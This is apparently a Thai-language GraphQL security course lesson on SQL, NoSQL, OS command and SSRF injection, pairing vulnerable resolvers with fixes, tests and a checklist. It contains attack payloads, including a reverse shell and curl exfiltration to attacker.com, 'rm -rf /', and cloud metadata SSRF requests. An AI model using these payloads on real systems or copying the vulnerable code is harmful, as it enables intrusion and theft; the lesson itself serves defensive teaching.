# Part 045 — GraphQL Injection Attacks 🔴

> **ระดับ:** Expert | **เวลาเรียน:** 150 นาที | **ขั้นตอนที่:** 691–740

---

## ⚠️ คำเตือน (Disclaimer)

เนื้อหานี้เป็นการศึกษา **Offensive Security** เพื่อวัตถุประสงค์ **Defensive** เท่านั้น ใช้สำหรับ:
- ทดสอบ API ของตัวเองหรือที่ได้รับอนุญาตอย่างเป็นลายลักษณ์อักษร
- Penetration testing ที่ authorized
- Defensive development

**การใช้เทคนิคเหล่านี้กับระบบที่ไม่ได้รับอนุญาตเป็นสิ่งผิดกฎหมาย**

---

## 🎯 สิ่งที่จะได้เรียนรู้

- GraphQL Injection คืออะไร
- ชนิดต่างๆ ของ GraphQL injection
- SQL Injection ผ่าน GraphQL
- NoSQL Injection ผ่าน GraphQL
- OS Command Injection
- SSRF ผ่าน GraphQL
- วิธีป้องกันทุกรูปแบบ

---

## 📌 Step 691: GraphQL Injection คืออะไร

**GraphQL Injection** คือการที่ attacker สอดแทรก malicious data ผ่าน GraphQL arguments เพื่อ:
- ดึงข้อมูลที่ไม่ควรเข้าถึง
- แก้ไขหรือลบข้อมูล
- Execute commands บน server
- SSRF (Server-Side Request Forgery)

```
Attack vector:
Client ─→ [GraphQL Args] ─→ Resolver ─→ [Database/OS/External Service]
            ↑ inject here                    ↑ payload executed here
```

---

## 📌 Step 692: ทำไม GraphQL ถึงมี Injection Risks

### ความเข้าใจผิดที่พบบ่อย

```
"GraphQL ป้องกัน injection เพราะมี type system"
→ ผิด! Type system ป้องกัน string ≠ int
   แต่ไม่ป้องกัน malicious string content
```

### Vulnerable Pattern

```javascript
// ❌ อันตราย — นำ input ไปใช้โดยตรง
const resolvers = {
  Query: {
    users: async (_, { filter }) => {
      // filter.name มาจาก client → อันตราย!
      const result = await db.query(
        `SELECT * FROM users WHERE name = '${filter.name}'`
      );
      return result;
    },
  },
};
```

---

## 📌 Step 693: SQL Injection ผ่าน GraphQL

### Vulnerable Code

```javascript
// ❌ SQL Injection Vulnerable
const resolvers = {
  Query: {
    user: async (_, { name }) => {
      // ไม่มี parameterization!
      const query = `SELECT * FROM users WHERE name = '${name}'`;
      return db.query(query);
    },
    
    searchUsers: async (_, { searchTerm }) => {
      // String concatenation = danger!
      const query = `SELECT * FROM users WHERE name LIKE '%${searchTerm}%'`;
      return db.query(query);
    },
  },
};
```

### Attack Payloads

```graphql
# Basic SQL Injection
query {
  user(name: "admin' OR '1'='1") {
    id
    email
    password
  }
}
# SQL: WHERE name = 'admin' OR '1'='1'
# → returns all users!

# Union-based extraction
query {
  user(name: "' UNION SELECT username, password, 3 FROM admin_users--") {
    id
    email
  }
}

# Time-based blind injection
query {
  user(name: "admin'; SELECT SLEEP(5);--") {
    id
  }
}

# Stacked queries (ถ้า driver รองรับ)
query {
  user(name: "admin'; DROP TABLE users;--") {
    id
  }
}

# Comment injection
query {
  searchUsers(searchTerm: "%'; -- -") {
    id
    email
  }
}

# Boolean-based blind
query {
  user(name: "admin' AND 1=1--") {   # true → returns admin
    id
  }
}
query {
  user(name: "admin' AND 1=2--") {   # false → no result
    id
  }
}
```

### ป้องกัน SQL Injection

```javascript
// ✅ วิธีที่ 1: Parameterized Queries
const resolvers = {
  Query: {
    user: async (_, { name }) => {
      // Parameterized → ปลอดภัย!
      const result = await db.query(
        'SELECT * FROM users WHERE name = $1',
        [name]  // ← parameter แยกจาก query
      );
      return result.rows[0];
    },
    
    searchUsers: async (_, { searchTerm }) => {
      const result = await db.query(
        'SELECT * FROM users WHERE name ILIKE $1',
        [`%${searchTerm}%`]  // ← escape ให้อัตโนมัติ
      );
      return result.rows;
    },
  },
};

// ✅ วิธีที่ 2: ORM (Sequelize, Prisma, TypeORM)
const resolvers = {
  Query: {
    user: async (_, { name }) => {
      // Prisma ป้องกัน injection อัตโนมัติ
      return prisma.user.findFirst({
        where: { name }  // ← ปลอดภัย
      });
    },
    
    searchUsers: async (_, { searchTerm }) => {
      return prisma.user.findMany({
        where: {
          name: {
            contains: searchTerm,  // ← ปลอดภัย
            mode: 'insensitive',
          }
        }
      });
    },
  },
};

// ✅ วิธีที่ 3: Input Validation + Whitelist
function sanitizeName(name) {
  // อนุญาตแค่ตัวอักษร, ตัวเลข, ช่องว่าง, ขีดกลาง
  if (!/^[a-zA-Z0-9\s\-ก-ฮ]+$/.test(name)) {
    throw new GraphQLError('Invalid characters in name');
  }
  return name;
}

const resolvers = {
  Query: {
    user: async (_, { name }) => {
      const safeName = sanitizeName(name);
      return db.query('SELECT * FROM users WHERE name = $1', [safeName]);
    },
  },
};
```

---

## 📌 Step 694: NoSQL Injection ผ่าน GraphQL

### MongoDB Injection

```javascript
// ❌ Vulnerable MongoDB code
const resolvers = {
  Query: {
    user: async (_, { email }) => {
      // email มาจาก client — อันตราย!
      return User.findOne({ email });  // ← อาจเป็น object!
    },
    
    users: async (_, { filter }) => {
      // filter object มาจาก client ทั้งหมด — อันตราย!
      return User.find(filter);  // ← NoSQL injection!
    },
  },
};
```

### Attack — MongoDB Operator Injection

```graphql
# ถ้า schema รับ JSON scalar หรือ Any type
query {
  user(email: { $ne: null }) {
    id
    email
    password
  }
}
# MongoDB query: { email: { $ne: null } }
# → returns ALL users (email ≠ null)

# Authentication bypass
mutation {
  login(email: { $regex: ".*" }, password: { $regex: ".*" }) {
    token
  }
}
# → Matches any email/password!

# Data exfiltration
query {
  users(filter: {
    password: { $regex: "^a" }    # ← password เริ่มต้นด้วย 'a'?
  }) {
    id
    email
  }
}
```

### ป้องกัน NoSQL Injection

```javascript
// ✅ วิธีที่ 1: ตรวจสอบ type ของ input
const resolvers = {
  Query: {
    user: async (_, { email }) => {
      // ตรวจสอบว่าเป็น string จริง
      if (typeof email !== 'string') {
        throw new GraphQLError('Email must be a string');
      }
      
      // Validate email format
      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
        throw new GraphQLError('Invalid email format');
      }
      
      return User.findOne({ email });
    },
  },
};

// ✅ วิธีที่ 2: Whitelist allowed operators
function sanitizeMongoFilter(filter) {
  // ไม่อนุญาต MongoDB operators
  const disallowedKeys = ['$where', '$function', '$expr'];
  
  function checkObject(obj, depth = 0) {
    if (depth > 5) throw new Error('Filter too deep');
    if (typeof obj !== 'object' || obj === null) return obj;
    
    for (const key of Object.keys(obj)) {
      if (key.startsWith('$') && !['$and', '$or', '$nor', '$eq', '$ne', '$gt', '$lt', '$gte', '$lte', '$in', '$nin', '$regex'].includes(key)) {
        throw new GraphQLError(`Operator ${key} not allowed`);
      }
      checkObject(obj[key], depth + 1);
    }
    return obj;
  }
  
  return checkObject(filter);
}

// ✅ วิธีที่ 3: ใช้ GraphQL Input Types (ดีที่สุด!)
// แทนที่จะรับ JSON filter — กำหนด structure ชัดเจน

// ❌ อันตราย
const badSchema = `
  type Query {
    users(filter: JSON): [User!]!  # ← รับ arbitrary JSON
  }
`;

// ✅ ปลอดภัย
const goodSchema = `
  type Query {
    users(filter: UserFilterInput): [User!]!  # ← structure ชัดเจน
  }
  
  input UserFilterInput {
    name: String
    email: String
    role: UserRole
    isActive: Boolean
    createdAfter: String
    createdBefore: String
    # ไม่มี raw MongoDB operator fields!
  }
`;

// Resolver ที่ปลอดภัย
const resolvers = {
  Query: {
    users: async (_, { filter = {} }) => {
      const mongoFilter = {};
      
      // Map ทีละ field ที่ allowed เท่านั้น
      if (filter.name) mongoFilter.name = new RegExp(escapeRegex(filter.name), 'i');
      if (filter.email) mongoFilter.email = filter.email.toLowerCase();
      if (filter.role) mongoFilter.role = filter.role;
      if (filter.isActive !== undefined) mongoFilter.isActive = filter.isActive;
      if (filter.createdAfter) mongoFilter.createdAt = { $gte: new Date(filter.createdAfter) };
      
      return User.find(mongoFilter);
    },
  },
};

// Escape regex special characters
function escapeRegex(str) {
  return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}
```

---

## 📌 Step 695: OS Command Injection ผ่าน GraphQL

```javascript
// ❌ อันตรายมาก — รัน OS command ด้วย user input
import { exec } from 'child_process';
import { promisify } from 'util';
const execAsync = promisify(exec);

const resolvers = {
  Query: {
    // Vulnerable: ใช้ input โดยตรงใน shell command
    checkDomain: async (_, { domain }) => {
      const { stdout } = await execAsync(`nslookup ${domain}`);
      return stdout;
    },
    
    convertImage: async (_, { filename, format }) => {
      // อันตราย!
      const { stdout } = await execAsync(
        `convert ${filename} output.${format}`
      );
      return stdout;
    },
  },
};
```

### Attack Payloads

```graphql
# Command injection
query {
  checkDomain(domain: "example.com; cat /etc/passwd") {
    result
  }
}
# Shell: nslookup example.com; cat /etc/passwd

# Reverse shell
query {
  checkDomain(domain: "x; bash -i >& /dev/tcp/attacker.com/4444 0>&1") {
    result
  }
}

# Data exfiltration
query {
  checkDomain(domain: "x; curl https://attacker.com/$(cat /etc/passwd | base64)") {
    result
  }
}

# File deletion
query {
  convertImage(filename: ". && rm -rf /", format: "jpg") {
    result
  }
}
```

### ป้องกัน Command Injection

```javascript
// ✅ วิธีที่ 1: ไม่ใช้ shell commands เลย
import dns from 'dns';
import { promisify } from 'util';

const resolvers = {
  Query: {
    // ใช้ DNS library แทน exec
    checkDomain: async (_, { domain }) => {
      // Validate domain format ก่อน
      const domainRegex = /^[a-zA-Z0-9][a-zA-Z0-9\-]{0,61}[a-zA-Z0-9]?\.[a-zA-Z]{2,}$/;
      if (!domainRegex.test(domain)) {
        throw new GraphQLError('Invalid domain format');
      }
      
      try {
        const addresses = await dns.promises.resolve(domain);
        return addresses.join(', ');
      } catch (err) {
        return `Cannot resolve: ${domain}`;
      }
    },
  },
};

// ✅ วิธีที่ 2: ถ้าต้องใช้ exec — ใช้ array arguments
import { execFile } from 'child_process';
import { promisify } from 'util';
const execFileAsync = promisify(execFile);

const resolvers = {
  Query: {
    // execFile ไม่ผ่าน shell → ปลอดภัยกว่า
    checkDomain: async (_, { domain }) => {
      // Validate ก่อน
      if (!/^[a-zA-Z0-9\-.]+$/.test(domain)) {
        throw new GraphQLError('Invalid domain');
      }
      
      // execFile ส่ง args เป็น array — ไม่มี shell interpolation
      const { stdout } = await execFileAsync('nslookup', [domain]);
      return stdout;
    },
  },
};

// ✅ วิธีที่ 3: Strict input validation
function validateAndSanitize(input, type) {
  switch (type) {
    case 'domain':
      if (!/^[a-zA-Z0-9][a-zA-Z0-9\-.]{0,253}[a-zA-Z0-9]$/.test(input)) {
        throw new GraphQLError('Invalid domain');
      }
      return input;
    
    case 'filename':
      // อนุญาตแค่ตัวอักษร, ตัวเลข, ขีดกลาง, ขีดล่าง, จุด
      if (!/^[a-zA-Z0-9\-_.]+$/.test(input)) {
        throw new GraphQLError('Invalid filename');
      }
      // ป้องกัน path traversal
      if (input.includes('..') || input.includes('/')) {
        throw new GraphQLError('Path traversal not allowed');
      }
      return input;
    
    case 'imageFormat':
      const allowedFormats = ['jpg', 'png', 'gif', 'webp'];
      if (!allowedFormats.includes(input)) {
        throw new GraphQLError(`Format must be one of: ${allowedFormats.join(', ')}`);
      }
      return input;
    
    default:
      throw new Error(`Unknown type: ${type}`);
  }
}
```

---

## 📌 Step 696: SSRF ผ่าน GraphQL

**SSRF (Server-Side Request Forgery)** — ทำให้ server fetch URLs ที่กำหนด:

```javascript
// ❌ Vulnerable
const resolvers = {
  Query: {
    fetchContent: async (_, { url }) => {
      // Server fetch URL ที่ client กำหนด
      const response = await fetch(url);
      return response.text();
    },
    
    importFromUrl: async (_, { url }) => {
      const data = await axios.get(url);
      return data.data;
    },
  },
};
```

### SSRF Attack Scenarios

```graphql
# เข้าถึง internal services
query {
  fetchContent(url: "http://localhost:8080/admin") { content }
  fetchContent(url: "http://192.168.1.1/admin") { content }
  fetchContent(url: "http://10.0.0.1:9200") { content }  # ElasticSearch
  fetchContent(url: "http://10.0.0.1:6379") { content }  # Redis
}

# AWS Metadata Service
query {
  fetchContent(url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/") { content }
}
# → ได้ AWS credentials!

# GCP Metadata Service
query {
  fetchContent(url: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token") { content }
}
# → ได้ GCP token!

# Internal API bypass
query {
  fetchContent(url: "http://internal-api.company.local/admin/users") { content }
}
```

### ป้องกัน SSRF

```javascript
// ✅ วิธีที่ 1: Whitelist URLs
const ALLOWED_DOMAINS = [
  'api.example.com',
  'cdn.example.com',
  'images.example.com',
];

function validateUrl(url) {
  let parsedUrl;
  try {
    parsedUrl = new URL(url);
  } catch {
    throw new GraphQLError('Invalid URL format');
  }
  
  // เฉพาะ HTTPS
  if (parsedUrl.protocol !== 'https:') {
    throw new GraphQLError('Only HTTPS URLs are allowed');
  }
  
  // Whitelist domains
  const isAllowed = ALLOWED_DOMAINS.some(domain => 
    parsedUrl.hostname === domain || 
    parsedUrl.hostname.endsWith(`.${domain}`)
  );
  
  if (!isAllowed) {
    throw new GraphQLError(`Domain ${parsedUrl.hostname} is not allowed`);
  }
  
  return parsedUrl.toString();
}

// ✅ วิธีที่ 2: Block internal IPs
import dns from 'dns';
import ipaddr from 'ipaddr.js';

async function isPrivateIp(hostname) {
  try {
    const addresses = await dns.promises.resolve4(hostname);
    for (const addr of addresses) {
      const ip = ipaddr.parse(addr);
      if (ip.range() !== 'unicast') return true; // loopback, private, etc.
    }
    return false;
  } catch {
    return true; // ถ้า resolve ไม่ได้ — ถือว่า unsafe
  }
}

async function safeFetch(url) {
  const parsedUrl = new URL(url);
  
  // Block private IPs
  if (await isPrivateIp(parsedUrl.hostname)) {
    throw new GraphQLError('Cannot fetch private/internal URLs');
  }
  
  // Block metadata service IPs
  const blockedRanges = [
    '169.254.169.254',  // AWS/GCP/Azure metadata
    '100.100.100.200',  // Alibaba metadata
  ];
  
  const resolvedIps = await dns.promises.resolve4(parsedUrl.hostname);
  for (const ip of resolvedIps) {
    if (blockedRanges.includes(ip)) {
      throw new GraphQLError('Access to metadata service is blocked');
    }
  }
  
  return fetch(url, {
    headers: { 'User-Agent': 'MyApp/1.0' }
  });
}
```

---

## 📌 Step 697: GraphQL-specific Attacks

### 1. Batching Attack (DoS)

```graphql
# ส่ง mutations จำนวนมากในครั้งเดียว
mutation {
  m1: createUser(input: { name: "u1", email: "u1@test.com" }) { id }
  m2: createUser(input: { name: "u2", email: "u2@test.com" }) { id }
  m3: createUser(input: { name: "u3", email: "u3@test.com" }) { id }
  # ... repeat 1000 times
  m1000: createUser(input: { name: "u1000", email: "u1000@test.com" }) { id }
}
```

```javascript
// ป้องกัน: จำกัด aliases ต่อ request
const server = new ApolloServer({
  typeDefs,
  resolvers,
  validationRules: [
    (context) => ({
      Document: {
        enter(node) {
          // Count total aliases/fields
          let fieldCount = 0;
          
          function countFields(selectionSet) {
            for (const selection of selectionSet.selections) {
              fieldCount++;
              if (selection.selectionSet) {
                countFields(selection.selectionSet);
              }
            }
          }
          
          node.definitions.forEach(def => {
            if (def.selectionSet) countFields(def.selectionSet);
          });
          
          if (fieldCount > 1000) {
            context.reportError(
              new GraphQLError(`Query too complex: ${fieldCount} fields (max 1000)`)
            );
          }
        },
      },
    }),
  ],
});
```

### 2. Field Duplication Attack

```graphql
# ขอ field เดิมซ้ำๆ หลายพัน alias
query {
  u1: user(id: "1") { name }
  u2: user(id: "1") { name }
  u3: user(id: "1") { name }
  # ... 10000 ครั้ง
}
```

### 3. Circular Fragment Attack

```graphql
fragment F1 on User {
  name
  friends {
    ...F2
  }
}

fragment F2 on User {
  name
  friends {
    ...F1  # ← circular!
  }
}

query {
  user(id: "1") {
    ...F1
  }
}
```

```javascript
// GraphQL จัดการ circular fragments ได้เอง (แต่ depth ต้องจำกัด)
import depthLimit from 'graphql-depth-limit';

const server = new ApolloServer({
  typeDefs,
  resolvers,
  validationRules: [depthLimit(7)],
});
```

---

## 📌 Step 698: ป้องกัน Injection — Complete Strategy

```javascript
// src/security/injection-prevention.js

// 1. Input Sanitization Library
export class InputSanitizer {
  static sanitizeString(value, maxLength = 255) {
    if (typeof value !== 'string') {
      throw new GraphQLError('Expected string value');
    }
    
    // Trim whitespace
    value = value.trim();
    
    // Check length
    if (value.length > maxLength) {
      throw new GraphQLError(`Value too long (max ${maxLength} chars)`);
    }
    
    // Remove null bytes
    value = value.replace(/\0/g, '');
    
    return value;
  }
  
  static sanitizeEmail(email) {
    email = this.sanitizeString(email, 254);
    
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
      throw new GraphQLError('Invalid email format');
    }
    
    return email.toLowerCase();
  }
  
  static sanitizeFilename(filename) {
    filename = this.sanitizeString(filename, 255);
    
    // No path traversal
    if (filename.includes('..') || filename.includes('/') || filename.includes('\\')) {
      throw new GraphQLError('Invalid filename');
    }
    
    // Only safe characters
    if (!/^[a-zA-Z0-9\-_.]+$/.test(filename)) {
      throw new GraphQLError('Filename contains invalid characters');
    }
    
    return filename;
  }
  
  static sanitizeUrl(url) {
    url = this.sanitizeString(url, 2000);
    
    try {
      const parsed = new URL(url);
      
      if (!['http:', 'https:'].includes(parsed.protocol)) {
        throw new GraphQLError('Only HTTP/HTTPS URLs allowed');
      }
      
      return url;
    } catch {
      throw new GraphQLError('Invalid URL format');
    }
  }
  
  static sanitizeSqlIdentifier(identifier) {
    // อนุญาตแค่ table/column names ที่ปลอดภัย
    if (!/^[a-zA-Z_][a-zA-Z0-9_]*$/.test(identifier)) {
      throw new GraphQLError('Invalid identifier');
    }
    return identifier;
  }
}
```

---

## 📌 Step 699: Testing สำหรับ Injection Vulnerabilities

```javascript
// test/security/injection.test.js
describe('Injection Prevention', () => {
  describe('SQL Injection', () => {
    const sqlPayloads = [
      "' OR '1'='1",
      "'; DROP TABLE users;--",
      "' UNION SELECT * FROM admin--",
      "admin'--",
      "1' AND sleep(5)--",
    ];
    
    it.each(sqlPayloads)('should block SQL payload: %s', async (payload) => {
      const response = await server.executeOperation({
        query: `query { user(name: "${payload}") { id } }`,
      });
      
      // ต้องไม่มี SQL error หรือข้อมูลรั่ว
      expect(response.body.singleResult.errors?.[0]?.message)
        .not.toContain('SQL');
      expect(response.body.singleResult.data?.user)
        .toBeNull(); // ไม่ควรพบ user
    });
  });
  
  describe('NoSQL Injection', () => {
    it('should reject MongoDB operator in string field', async () => {
      const response = await server.executeOperation({
        query: `query { users(filter: { email: { $ne: null } }) { id } }`,
      });
      
      // ต้องมี type error (email ต้อง String ไม่ใช่ Object)
      expect(response.body.singleResult.errors).toBeDefined();
    });
  });
  
  describe('Command Injection', () => {
    const cmdPayloads = [
      '; cat /etc/passwd',
      '| ls -la',
      '`whoami`',
      '$(id)',
      'x && echo vulnerable',
    ];
    
    it.each(cmdPayloads)('should block command: %s', async (payload) => {
      const response = await server.executeOperation({
        query: `query { checkDomain(domain: "example.com${payload}") { result } }`,
      });
      
      expect(response.body.singleResult.errors).toBeDefined();
      expect(response.body.singleResult.errors[0].message)
        .toContain('Invalid domain');
    });
  });
});
```

---

## 📌 Step 700: Security Summary

### Prevention Checklist

```
SQL Injection:
✅ ใช้ Parameterized queries เสมอ
✅ ใช้ ORM (Prisma, Sequelize, TypeORM)
✅ Validate input ก่อนนำไปใช้
✅ Whitelist characters ที่อนุญาต
✅ ไม่ใช้ string concatenation

NoSQL Injection:
✅ ใช้ GraphQL Input Types (ไม่ใช้ JSON scalar)
✅ Validate ว่า input เป็น expected type
✅ Block MongoDB operators ใน user input
✅ ใช้ Mongoose / Prisma (ORM)
✅ เปิด strict mode

Command Injection:
✅ ไม่ใช้ exec() กับ user input เด็ดขาด
✅ ใช้ execFile() ถ้าจำเป็น
✅ Whitelist allowed commands/values
✅ Validate file paths (no traversal)
✅ Sandbox execution environment

SSRF:
✅ Whitelist allowed external domains
✅ Block private/internal IPs
✅ Block metadata service endpoints
✅ ใช้ egress filtering ระดับ network
✅ ไม่อนุญาต file:// protocol

General:
✅ Defense in depth
✅ Input validation ที่ฝั่ง server เสมอ
✅ Logging และ monitoring
✅ Regular security testing
✅ Dependency updates
```

---

## 📌 Step 701: สรุป Part 045

### เนื้อหาที่เรียนรู้

✅ GraphQL injection คืออะไร  
✅ SQL injection ผ่าน GraphQL + วิธีป้องกัน  
✅ NoSQL injection ผ่าน GraphQL + วิธีป้องกัน  
✅ OS command injection + วิธีป้องกัน  
✅ SSRF attacks + วิธีป้องกัน  
✅ Batching attacks  
✅ Input sanitization library  
✅ Security testing  

### Homework

1. สร้าง vulnerable endpoint แล้วทดสอบ SQL injection (บน local เท่านั้น!)
2. Fix vulnerability ด้วย parameterized queries
3. เพิ่ม input sanitization ให้ resolver ทุกตัว
4. เขียน integration tests สำหรับ injection prevention

### ในส่วนถัดไป

➡️ **[Part 046](./part-046.md)** — SQL Injection via GraphQL: Deep Dive

---

*Part 045 of 100+ | หลักสูตร GraphQL ฉบับสมบูรณ์*
